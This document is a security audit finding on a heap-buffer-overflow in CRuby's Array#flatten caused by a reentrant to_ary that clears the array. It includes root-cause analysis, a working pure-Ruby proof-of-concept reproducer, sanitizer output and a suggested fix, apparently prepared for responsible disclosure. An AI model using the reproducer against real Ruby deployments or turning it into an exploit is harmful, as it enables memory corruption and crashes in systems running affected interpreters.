# FINDING-002 — heap-buffer-overflow in `Array#flatten` via reentrant `to_ary`

- **Status:** CONFIRMED on CRuby `master` `c4e06b4e30` (ruby 4.1.0dev, aarch64-linux), ASan build
  `taxoshop/cruby-asan-ubsan:current`. **No matching upstream report found — apparently novel.**
- **Parent taxonomy:** `workflow-0137` (reentrant argument conversion invalidates a backing
  resource; stale length/pointer reused) with `workflow-0080` flavor. Battery test `t18`.
- **Class:** same family as the *already-fixed* `Array#sort!` overflow (#20427) and the
  `Array#difference` mutating-`hash` overflow — reentrant array mutation → `ary_memcpy` overflow.
  Those methods were patched; **`flatten` was missed**.

## Root cause

`flatten` (array.c:6696):

```
array.c:6703   for (i = 0; i < RARRAY_LEN(ary); i++) {
array.c:6704       elt = RARRAY_AREF(ary, i);
array.c:6705       tmp = rb_check_array_type(elt);      // <-- runs user to_ary (reentrant)
array.c:6706       if (!NIL_P(tmp)) break;
array.c:6709   }
...
array.c:6714   result = ary_new(0, RARRAY_LEN(ary));
array.c:6715   ary_memcpy(result, 0, i, RARRAY_CONST_PTR(ary));   // <-- copies `i` elements
array.c:6716   ARY_SET_LEN(result, i);
```

The scan records the split index `i` — the position of the first element that responds to
`to_ary`. `rb_check_array_type` (array.c:6705 → object.c:3303 `convert_type_with_id`) invokes the
element's **user-defined `to_ary`**. If that `to_ary` calls `ary.clear` (or `replace`/anything
shrinking the array), `rb_ary_clear`→`ary_resize_capa`→`ary_heap_realloc` (array.c:396)
**reallocates `ary`'s heap buffer to a much smaller capacity**. The count `i` captured before the
callout is now stale. At array.c:6715 `ary_memcpy(result, 0, i, RARRAY_CONST_PTR(ary))` copies
`i` elements (here 2000 × 8 = 16000 bytes) from the reallocated 256-byte buffer → **heap-buffer-
overflow READ** (and `result`, sized `RARRAY_LEN(ary)` == 0 after clear, is also under-allocated
for the write). There is no re-read of the length nor a mutation guard after `rb_check_array_type`.

## Reproducer (no ctypes, pure Ruby) — `ruby_audit1/repro/h137_flatten_min.rb`

```ruby
a = (1..2000).to_a
bad = Object.new
$a = a
def bad.to_ary; $a.clear; [1,2,3]; end
a << bad          # bad at index 2000, so the scan sets i=2000 before clear
a.flatten
```

Deterministic with a large array (stale `i` must exceed the shrunk capacity). The malicious
element must sit at a high index so `i` is large when `to_ary` fires.

## Sanitizer output (saved: `ruby_audit1/logs/h137_flatten.asan.txt`)

```
==7==ERROR: AddressSanitizer: heap-buffer-overflow ...
READ of size 16000 ... thread T0
    #3 ary_memcpy0  array.c:354
    #4 ary_memcpy   array.c:371
    #5 flatten       array.c:6715            <-- USE (stale count i)
    #6 rb_ary_flatten array.c:6924
0x... is located 0 bytes after 256-byte region [...]
allocated by thread T0 here:
    #4 ary_heap_realloc  array.c:396
    #5 ary_resize_capa   array.c:439
    #6 rb_ary_clear      array.c:4988         <-- SHRINK (via to_ary)
    ...
    #18 convert_type_with_id       object.c:3303
    #21 rb_check_array_type        array.c:1032
    #22 flatten                    array.c:6705  <-- reentrant conversion
```

## Trigger conditions

- `Array#flatten` (or `flatten(level)`) on an array containing an element with a user `to_ary`.
- The `to_ary` shrinks/reallocates the receiver array (`clear`, `replace([])`, large `pop` loop).
- The malicious element sits at a high index (large split count `i`) and the array is large
  enough that the stale `i` exceeds the post-shrink capacity → deterministic overflow.

## Fix direction (for reference; we do not patch)

After the scan loop, re-read `RARRAY_LEN(ary)` and clamp `i`/the memcpy count to the *current*
length before `ary_memcpy` (array.c:6715); or snapshot the prefix into `result` incrementally
during the scan; or detect mutation (length change) across `rb_check_array_type` and restart /
raise, mirroring the `Array#sort!` fix in #20427.

## Duplicate analysis

- **git history (checkout):** no fix in `array.c` for flatten + to_ary + overflow/reentrancy.
- **Ruby tracker (web):** flatten hits #5759 / #10748 are *behavioral* ("flatten calls to_ary on
  everything" / on wrong levels), not memory-safety. The `ary_memcpy`-overflow class is being
  swept — #20427 fixed **`Array#sort!`** only (Closed, backported 3.3), and `Array#difference`
  (mutating `hash`) was fixed — but **no flatten report found**. This instance is live on master.
- **Caveat:** web search is not exhaustive; recommend a final manual bugs.ruby-lang.org search
  ("flatten", "heap-buffer-overflow", "to_ary") before filing. Strong candidate to file (and to
  co-report the whole family: check `Array#difference`/`concat`/`replace`-adjacent methods for the
  same stale-length-after-`to_ary`/`hash` shape).
